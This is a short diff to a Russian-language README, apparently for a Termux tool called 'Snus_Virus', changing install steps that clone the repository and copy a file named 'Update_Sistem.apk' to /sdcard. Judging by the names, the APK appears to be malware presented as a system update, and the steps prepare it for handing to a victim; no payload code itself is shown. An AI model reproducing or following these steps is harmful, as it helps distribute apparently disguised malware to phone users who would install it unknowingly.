@@ -18,6 +18,6 @@
 $ `pkg install git`<br>
 $ `git clone https://github.com/Youhosttost/Snus_Virus`<br>
 $ `cd Snus_Virus`<br>
-$ `cp Update_Sistem.apk`<br>
-# Запуск
-$ `Snus_Virus`<br>q
+$ `cp Update_Sistem.apk /sdcard/`<br>
+
+Дальше наш апк появляется на sdcard!
